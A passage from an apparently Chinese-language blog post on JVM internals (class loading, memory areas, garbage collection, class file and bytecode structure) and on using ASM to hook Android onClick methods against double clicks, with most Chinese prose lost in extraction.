mutableSetOf<String>()\n            for (methodNode in methods) {\n                // UncheckViewOnClick \n                if (methodNode.isStatic ||\n                    methodNode.hasUncheckViewOnClickAnnotation(config)\n                ) {\n                    continue\n                }\n                val methodNameWithDesc = methodNode.nameWithDesc\n                if (methodNode.onlyOneViewParameter) {\n                    if (methodNode.hasCheckViewAnnotation(config)) {\n                        // CheckViewOnClick \n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    } else if (methodNode.hasButterKnifeOnClickAnnotation()) {\n                        // ButterKnife method  OnClick \n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    }\n                }\n                if (classNode.isHookPoint(config, methodNode)) {\n                    shouldHookMethodList.add(methodNameWithDesc)\n                    continue\n                }\n                // lambda \n                val invokeDynamicInsnNodes = methodNode.findHookPointLambda(config)\n                invokeDynamicInsnNodes.forEach {\n                    val handle = it.bsmArgs[1] as? Handle\n                    if (handle != null) {\n                        shouldHookMethodList.add(handle.name + handle.desc)\n                    }\n                }\n            }\n            if (shouldHookMethodList.isNotEmpty()) {\n                for (methodNode in methods) {\n                    val methodNameWithDesc = methodNode.nameWithDesc\n                    if (shouldHookMethodList.contains(methodNameWithDesc)) {\n                        val argumentTypes = Type.getArgumentTypes(methodNode.desc)\n                        val viewArgumentIndex = argumentTypes?.indexOfFirst {\n                            it.descriptor == ViewDescriptor\n                        } ?: -1\n                        if (viewArgumentIndex >= 0) {\n                            val instructions = methodNode.instructions\n                            if (instructions != null && instructions.size() > 0) {\n                                val list = InsnList()\n                                list.add(\n                                    VarInsnNode(\n                                        Opcodes.ALOAD, getVisitPosition(\n                                            argumentTypes,\n                                            viewArgumentIndex,\n                                            methodNode.isStatic\n                                        )\n                                    )\n                                )\n                                list.add(\n                                    MethodInsnNode(\n                                        Opcodes.INVOKESTATIC,\n                                        config.formatDoubleCheckClass,\n                                        config.doubleCheckMethodName,\n                                        config.doubleCheckMethodDescriptor\n                                    )\n                                )\n                                val labelNode = LabelNode()\n                                list.add(JumpInsnNode(Opcodes.IFNE, labelNode))\n                                list.add(InsnNode(Opcodes.RETURN))\n                                list.add(labelNode)\n                                instructions.insert(list)\n                            }\n                        }\n                    }\n                }\n                val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n                classNode.accept(classWriter)\n                return classWriter.toByteArray()\n            }\n        }\n        return byteArray\n    }\n\n    private fun ClassNode.isHookPoint(config: DoubleClickConfig, methodNode: MethodNode): Boolean {\n        val myInterfaces = interfaces\n        if (myInterfaces.isNullOrEmpty()) {\n            return false\n        }\n        val extraHookMethodList = config.hookPointList\n        extraHookMethodList.forEach {\n            if (myInterfaces.contains(it.interfaceName) && methodNode.nameWithDesc == it.methodSign) {\n                return true\n            }\n        }\n        return false\n    }\n\n    private fun MethodNode.findHookPointLambda(config: DoubleClickConfig): List<InvokeDynamicInsnNode> {\n        val onClickListenerLambda = findLambda {\n            val nodeName = it.name\n            val nodeDesc = it.desc\n            val find = config.hookPointList.find { point ->\n                nodeName == point.methodName && nodeDesc.endsWith(point.interfaceSignSuffix)\n            }\n            return@findLambda find != null\n        }\n        return onClickListenerLambda\n    }\n\n    override fun getInputTypes(): Set<QualifiedContent.ContentType> {\n        return TransformManager.CONTENT_CLASS\n    }\n\n    override fun getScopes(): MutableSet<in QualifiedContent.Scope> {\n        return mutableSetOf(\n            QualifiedContent.Scope.PROJECT,\n            QualifiedContent.Scope.SUB_PROJECTS,\n//            QualifiedContent.Scope.EXTERNAL_LIBRARIES\n        )\n    }\n\n}\n~~~\n\n`BaseTransform`class`modifierClass(byteArray: ByteArray): ByteArray`asm\n\n\n\n- hookButterKnifeonClickView#setOnClickListener\n- hook\n\n> \n\n## \n\n![13202633-3cb11d1712a9efc9](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp)\n\n### \n\n####  Loading\n\n> io\n>\n> \n>\n> 1. \n> 2. \n> 3. java.lang.Class\n>\n> \n\n####  Verification\n\n> Class\n>\n> 1. \n> 2. ******\n> 3. \n> 4. \n\n####  Preparation\n\n> \n\n\n\n~~~java\npublic class Main {\n    public static int value = 12345;\n}\n~~~\n\nvalue5value0\n\n####  Resolution\n\n> \n>\n> - JavaClass\n> - \n>\n> \n>\n> - \n> - \n>\n> - \n>\n> - \n\n####  Initialization\n\n> <client><client><client><client><client>()\n>\n> java\n>\n> - newfinal\n>\n> - \n>\n> - java.lang.reflect\n>\n> - main\n>\n> - jdk 1.7java.lang.invoke.MethodHandle REF_getStaticREF_putStaticREF_invokeStatic\n\n####  Unloading\n\n> ClassclassLoadergc rootsgc rootsgcjvm(JavaAgent\n\n###  (ClassLoader)\n\n#### \n\nJVM  ClassLoader ClassLoader  jar \n\nJVM  ClassLoader BootstrapClassLoaderExtensionClassLoader  AppClassLoader\n\nBootstrapClassLoader  JVM  JAVA_HOME/lib/rt.jar  java.xxx.*  java.util.*java.io.*java.nio.*java.lang.*  ClassLoader  C \n\nExtensionClassLoader  JVM  swing  js xml   javax  jar  JAVA_HOME/lib/ext/*.jar  jar \n\nAppClassLoader  Classpath  jar  jar \n\n jar  classjdk  URLClassLoader URLClassLoader URLClassLoader ExtensionClassLoader  AppClassLoader  URLClassLoader \n\nAppClassLoader  ClassLoader  getSystemClassLoader()  main  AppClassLoader\n\n#### ClassLoader \n\n ClassLoader  Class  ClassLoader  Class  Class  Class  classLoader \n\n ClassLoader  main  ClassLoader  AppClassLoader\n\n#### \n\n\n\n**Java**java.lang.Objectrt.jarBootstrap ClassLoaderObjectjava.lang.ObjectClassPathObjectrt.jarJava\n\n![](https://img-blog.csdn.net/20160506184936657)\n\n****\n\njava.lang.ClassLoaderloadClass()loadClass()ClassNotFoundExceptionfindClass()\n\n```java\nprotected synchronized Class<?> loadClass(String name,boolean resolve)throws ClassNotFoundException{\n    //check the class has been loaded or not\n    Class c = findLoadedClass(name);\n    if(c == null){\n        try{\n            if(parent != null){\n                c = parent.loadClass(name,false);\n            }else{\n                c = findBootstrapClassOrNull(name);\n            }\n        }catch(ClassNotFoundException e){\n            //if throws the exception ,the father can not complete the load\n        }\n        if(c == null){\n            c = findClass(name);\n        }\n    }\n    \n    if(resolve){\n        resolveClass(c);\n    }\n    return c;\n}\n```\n\nJavaJDKThread Context ClassLoaderJava\n\n## Hook\n\n### Hook\n\nhook**hook**\n\n### Hook\n\n![img](https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg)\n\n/Hook\n\n:\n\n~~~kotlin\nobject ServiceHolder {\n    val apiService: IWebServiceRepository = WebServiceRepository()\n    // ...\n}\n\n// WebServiceRepository\nclass WebServiceRepository : IWebServiceRepository {\n    private val BASE_URL = \"https://api.bifrost.kim\"\n    \n    override fun getJsonData(): Data {\n        // ...\n    }\n}\n~~~\n\n\n\napiService\n\nInvocationHandler\n\nasm\n\n### LSposedHook ()\n\n>  \n","source":"_posts/simple-in-simple-out-jvm.md","raw":"---\ntitle: JVM\ndate: 2022-07-31\nauthor: \nhide: false\nsummary: \ncategories: \ntags:\n  - JVM\n  - \n  - ASM\n---\n\n# JVM & Hook\n\n> \n\n## JVM\n\n**Java Virtual Machine**Java\n\n> Virtual Machine\n\nJVM****JavaAPIAPI****(native)nativejava\n\nJVMJVM`java -jar`jar, JVMJVM****jarMETA-INFmain\n\nJavaJVMJavaAPIJVM ***Write once, run anywhere***native(C, C++, Rust, Go...)JVM\n\n## JVM\n\n\n\n### Sun Classic VM\n\n> \n\nJava\n\n### HotSpot VM\n\n> \n\nJava\n\n### Graal VM\n\n> \n\nJVMJavaNode.jsExpress\n\n### Dalvik VM\n\n> Android\n\n> Dalvik[Google](https://baike.baidu.com/item/Google/86964)Android[](https://baike.baidu.com/item//104440)DalvikGoogleAndroid .dexDalvik ExecutableJava.dexDalvik[](https://baike.baidu.com/item//2844535)Dalvik Dalvik Linux \n>\n> DalvikIOS\n>\n> 2014625Android L I/OAndroid L [](https://baike.baidu.com/item//117920)DalvikART\n\n### ART\n\n> ART(Android Runtime)Android 4.4DalvikAndroid 4.4DVMARTAndroid 5.0ARTDVM\n\n**DalvikdexART**\n\n> DalvikdexJITdexdexJITDalvikART DalvikARTdexapkdex4.4ART\n\nART:\n\n- \n- \n- \n- \n\nART:\n\n- 10%-20%\n- \n\n> ARTGC\n\n// TODO \n\n## JDK8\n\njvmjvm\n\n// TODO\n\n## \n\nCC++/C++MMKVC++(JavaUnsafe/C++)\n\nJVMJVM/JVMJVM\n\n### \n\nJavaJava:\n\n![Java](http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png)\n\n#### \n\n****(), ****\n\nJava****)****\n\n**---Java & ---**\n\n\n\n> JavaCPU\n\n> ****CPUCPUCPU\n\n****: \n\n`Thread.sleep(long)`cpuJava\n\ncpu\n\ncpu`Thread#yield()`,****\n\ncpu\n\n> Thread#sleep\n>\n> \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t CPU\n\n`Thread.sleep()`\n\njava:)************\n\n![](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/20220708-161709.jpg)\n\n**------**\n\nJVMOOM\n\n> Java\n>\n> (undefined)\n\n#### \n\nJvmC/C++C++nativeJvmJVMvirtual machineC++JavaJVM\n\n, ****\n\n\n\n>\n>\n>```java\n>public class Main {\n>    public static void main(String[] args) {\n>        int res = a();\n>        System.out.println(res);\n>    }\n>\n>    public static int a(){\n>        return b();\n>    }\n>\n>    public static int b(){\n>        return c();\n>    }\n>\n>    public static int c(){\n>        int a = 10;\n>        int b = 20;\n>        return a + b;\n>    }\n>}\n>```\n>\n>`a() -> b() -> c() -> `\n>\n>`main`\n>\n>![image-20220131142625842](https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg)\n>\n>`a()``a()``main`\n>\n>![image-20220131143641690](https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg)\n>\n>abcc\n>\n>![image-20220131144209743](https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg)\n>\n>ca+bcc43432211\n>\n>![image-20220131144955668](https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg)\n\n****(StackOverFlowException)`-Xss size`vm options\n\n:\n\n\n\n- ****\n\n?\n\n- ****\n\n#### \n\n\n\n#### Java\n\nJava, GCJava\n\n#### \n\nJava****Java(Non-Heap)Java\n\nHotSpot VM\n\n> JIT\n>\n> jvm\n>\n> ![img](https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg)\n\n****\n\nJVMclass\n\n****Javac++`String#intern()`\n\n> String#intern\n>\n> String#intern\n>\n> java\n>\n> StringStringnew\n\n### \n\n#### \n\n##### \n\njvmnew\n\n##### \n\n- \n\n\tJava\n\n- \n\n\tJava\n\n****: \n\n- CAS\n- \n\n##### \n\nnull\n\n#####  (Object Header)\n\nJavahash code(`Object#hashCode()`)GC****\n\n##### \n\n`Unsafe#allocateInstance()`(GsonKtKtGson)\n\n#### \n\nHotSpot: (Header)(Instance Data)(Padding)\n\n: HashCodeGCID32643264bitMark World\n\n\n\nHotSpot88812\n\n#### \n\njava**reference**()Javareference********\n\n##### \n\n>  Javareference\n\nreferenceGCreference\n\n![20220708-221205](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png)\n\n##### \n\n> Javareference\n\njava**HotSpot**\n\n![20220708-221128](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png)\n\n###  (GC)\n\n\n\n####  & \n\nJava\n\n##### \n\n+1-10\n\nJava\n\n##### \n\nJavaC#******GC Roots******GC Roots****\n\nGC Roots:\n\n- \n-  Java\n-  \n- JNI\n- Java**Class**NullPointerException\n\n![](https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\n#### \n\nGCGCJDK1.2Java****\n\n##### \n\nGC\n\n##### \n\nGC`SoftReference`\n\n##### \n\nGC`WeakReference`\n\n##### \n\n`PhantomReference`\n\n#### \n\n##### \n\n\n\n\n\nJava************HotSpotJDK8JDK8********\n\nHotSpotEdenSurvivor811GC\n\n![image-20220222151708141](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg)\n\n\n\nEden\n\n![image-20220222153104582](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg)\n\nEdenSurvivorFromToGCEdenFromFromToFromToToFrom\n\n![image-20220222154032674](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg)\n\nFromEdenFromToGC`+1``15`From\n\n![image-20220222154828416](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg)\n\nToFrom\n\n\n\n* Minor GC   -   \n\n  * Eden\n\n* Major GC   -   \n\n* Full GC      -    Java\n\n  * 1\n  * 2Minor GC\n  * 3JDK8\n  * 4`System.gc()`\n\n  ![image-20220222205605690](https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg)\n\n##### -\n\n`-`\n\nGC Roots\n\n![image-20220222165709034](https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg)\n\n \n\n##### -\n\n-\n\n\n\n![image-20220222210942507](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg)\n\nSurvivor8:1:1\n\n##### -\n\n-GCGC50%\n\n\n\n![image-20220222213208681](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg)\n\nStop The World\n\n\n\n####  ()\n\n##### Serial\n\nJDK1.3.1\n\n![image-20220223104605648](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg)\n\nGC15\n\n\n\n1. \n2. \n\n##### ParNew\n\nSerial\n\n![image-20220223111344962](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg)\n\nSerialJVMParNew\n\n##### CMS\n\nJDK1.5HotSpotCMSConcurrent-Mark-SweepHotSpotGCGC\n\n\n\n![image-20220223114019381](https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg)\n\n4\n\n* GC Roots\n* GC Roots\n* \n* \n\nFull GC\n\nGCG1CMS\n\n##### Garbage First (JDK9+)\n\nJDK7JDK9JDK8 Parallel Scavenge + Parallel Old \n\n`Minor GC``Major GC ``Full GC`G1Java`2048``Region``Region`1MB32MB2N`Region`JVM\n\n`Region``Region`EdenSurvivorG1HumongousRegion\n\n![image-20220223123636582](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg)\n\nCMS\n\n![image-20220223123557871](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg)\n\n\n\n* GC RootsTAMSRegionMinor GCG1\n* GC Root\n* \n* RegionRegionRegionRegionRegionRegion\n\n##### Shenandoah & ZGC ()\n\nG1G1GC\n\n## \n\n:D\n\n### \n\nJavaJVMJarJarclassclassclassKotlinJavaktJavaKotlinJVM\n\n### \n\nClass888ClassC: ****, ****\n\n\n\n~~~java\npublic class TestClazz {\n    public static void main(String[] args) {\n        int a = 1;\n        int b = 2 + a;\n        System.out.println(sum(a, b));\n    }\n\n    private static int sum(int a, int b) {\n        System.out.println(\"execute sum function.\");\n        return a + b;\n    }\n}\n~~~\n\n`javap -verbose` \n\n~~~\nClassfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"\n~~~\n\n####  & Class\n\nclass4Byte(Magic Number), classByteclass`0xCAFE BABE`Java:)\n\n![aZx0S4EjfY](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg)\n\n![20220709-173350](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg)\n\n7341652Java8\n\n56Minor Version,78Major VersionJava45JDK1.1JDK+1JDKClassClass\n\n#### \n\n\n\n~~~\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n~~~\n\nClassClass\n\n1\n\n|                       |  |                                                          |\n| :-----------------------: | :--: | :----------------------------------------------------------: |\n|    CONSTANT_Utf8_info     |  1   |                    UTF-8                     |\n|   CONSTANT_Integer_info   |  3   |  |\n|    CONSTANT_Class_info    |  7   |                                            |\n|   CONSTANT_String_info    |  8   |                                            |\n|  CONSTANT_Fieldref_info   |  9   |                                                |\n|  CONSTANT_Methodref_info  |  10  |                                                |\n| CONSTANT_MethodType_info  |  16  |                                                      |\n| CONSTANT_NameAndType_info |  12  |                                      |\n\n\n\n`CONSTANT_Methodref_info`Java 222\n\n|                     |   |  |                                                 |\n| :---------------------: | :---: | :--: | :-------------------------------------------------: |\n| CONSTANT_Methodref_info |  tag  |  u1  |                       10                        |\n|                         | index |  u2  |   CONSTANT_Class_info   |\n|                         | index |  u2  | CONSTANT_NameAndType_info |\n\n`CONSTANT_Class_info``CONSTANT_NameAndType_info`\n\n|                 |   |  |                      |\n| :-----------------: | :---: | :--: | :----------------------: |\n| CONSTANT_Class_info |  tag  |  u1  |          7           |\n|                     | index |  u2  |  |\n\n|                       |   |  |                              |\n| :-----------------------: | :---: | :--: | :------------------------------: |\n| CONSTANT_NameAndType_info |  tag  |  u1  |              12              |\n|                           | index |  u2  |    |\n|                           | index |  u2  |  |\n\n##### \n\nsumNameAndType\n\n> #30 = NameAndType        #23:#24        // sum:(II)I\n\n#23`sum`#24`(II)I`\n\n(II)IIintIint\n\n:\n\n![image-20220223192518999](https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg)\n\n`()V`void\n\n:\n\n> public Set<ArathothAttribute> getAttrInstSet()\n>\n> ()Ljava/util/Set<ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;>;\n>\n> \n>\n> \n\n> public Double getRandom(Double value1, Double value2)\n>\n> (Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;\n>\n> \n>\n> \n>\n> public double sum(Double value1, double value2) {\n>\n> \t\treturn value1 + value2;\n>\n> }\n>\n> :), value1doubleValue()\n>\n> java\n\n> \n>\n> public double[] getRandomNums()\n>\n> ()[D\n>\n> [\n\n#### \n\n\n\n~~~\n  flags: ACC_PUBLIC, ACC_SUPER\n~~~\n\n//\n\n:\n\n![image-20220223200619811](https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg)\n\n:\n\n![image-20220223201053780](https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg)\n\n:\n\n|          |  |                              |\n| ---------------- | ------ | -------------------------------- |\n| ACC_PUBLIC       | 0x0001 | public                 |\n| ACC_PRIVATE      | 0x0002 | private                |\n| ACC_PROTECTED    | 0x0004 | protected              |\n| ACC_STATIC       | 0x0008 | static                 |\n| ACC_FINAL        | 0x0010 | final                  |\n| ACC_SYNCHRONIZED | 0x0020 | synchronized           |\n| ACC_BRIDGE       | 0x0040 |  |\n| ACC_VARARGS      | 0x0080 |              |\n| ACC_NATIVE       | 0x0100 | native                 |\n| ACC_ABSTRACT     | 0x0400 | abstract               |\n| ACC_STRICT       | 0x0800 | strictfp               |\n| ACC_SYNTHETIC    | 0x1000 |          |\n\n#### \n\n> ASM\n\n********main\n\n```java\npublic static void main(String[] args) {\n    int a = 1;\n    int b = 2 + a;\n    System.out.println(sum(a, b));\n}\n```\n\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n\n---\n\n> iconst_1\n\nint`1`****, 1`int a = 1`1\n\n> istore_1\n\nint****1`1``int a = 1`\n\n> iconst_2\n\nint`2`****2 `int b = 2 + a`2\n\n> iload_1\n\nint****1`a`\n\n> iadd\n\n****int****`int b = 2 + a`\n\n> istore_2\n\nint********2`int b = 2 + a`\n\n> getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n\n`System.out`, `Ljava/io/PrintStream`,****`#2``Field java/lang/System.out:Ljava/io/PrintStream;`\n\n> iload_1\n\nint`a`****\n\n> iload_2\n\nintb****\n\n> invokestatic  #3                  // Method sum:(II)I\n\nintint\n\n> invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n\n`PrintStream#println`receiverjavakotlinreceiver\n\n> return\n\nvoid\n\n---\n\n****\n\njvm\n\n:)\n\n### ASM\n\nASM/Javassist/cglib/?\n\n- / gradlegradleshadowJar(relocate))\n- InvocationHandler\n- asm\n- jvm[MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)](https://github.com/MeiVinEight/ReflectionFX)MethodHandle\n\n\n\nandroiddex\n\nasmjdkasmasm\n\n#### ASM Core API & Tree API\n\n##### Core API\n\nASM ASMJar/class//ASM() kapt/kspasm, kapt/kspasm\n\n[ |  (runoob.com)](https://www.runoob.com/design-pattern/visitor-pattern.html)\n\n:\n\nASMclassAPI\n\n```java\npublic abstract class ClassVisitor {\n        ......\n    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);\n    //\n    public FieldVisitor visitField(int access, String name, String desc, String signature, Object value);\n    //\n    public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions);\n    public void visitEnd();\n}\n```\n\nClassVisitor\n\n> ###### 1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\n>\n> class\n>\n> versionclass\n>\n> access \n>\n> name\n>\n> signatureclassnull\n>\n> superName\n>\n> interfaces\n>\n> ###### 2void visitAnnotation(String descriptor, boolean visible)\n>\n> class\n>\n> descriptor\n>\n> visible\n>\n> ###### 3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\n>\n> classFieldVisitor\n>\n> name\n>\n> descriptor\n>\n> value\n>\n> `Integer``Float``Long``Double``String``int``float``long` `String`**null\n>\n> ###### 4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\n>\n> classMethodVisitor\n>\n> name\n>\n> descriptor\n>\n> signature\n>\n> exceptions\n>\n> ###### 5visitInnerClass(String name, String outerName, String innerName, int access)\n>\n> class********\n>\n> name`com/hebaibai/example/demo/Aoo$1XX`\n>\n> outerName\n>\n> innerName\n>\n> ###### 6visitOuterClass(String owner, String name, String descriptor)\n>\n> \n>\n> classvisitInnerClass`com/hebaibai/example/demo/Aoo$1``com/hebaibai/example/demo/Aoo$1XX`\n>\n> ```javascript\n> ClassReader classReader = new ClassReader(\"com/hebaibai/example/demo/Aoo$1\");\n>  classReader.accept(new DemoClassVisitor(Opcodes.ASM7), ClassReader.SKIP_CODE);\n> ```\n>\n> \n>\n> \n>\n> ownerclass\n>\n> namenull\n>\n> descriptor\n\nClassVisitorClassVisitorMethodVistitor/FieldVisitor)\n\nClassWritervisitHelloWorld\n\n```kotlin\nfun main() {\n    val classWriter = ClassWriter(0)\n    classWriter.visit(\n        V1_8,\n        ACC_PUBLIC + ACC_SUPER,\n        \"org/example/asmlearn/ASMLearn_Test\",\n        null,\n        \"java/lang/Object\",\n        null\n    )\n    val mv = classWriter.visitMethod(\n        ACC_PUBLIC + ACC_STATIC,\n        \"main\",\n        \"([Ljava/lang/String;)V\",\n        null,\n        null\n    )\n    mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\")\n    mv.visitLdcInsn(\"Hello, World!\")\n    mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false)\n    mv.visitInsn(RETURN)\n    mv.visitMaxs(2, 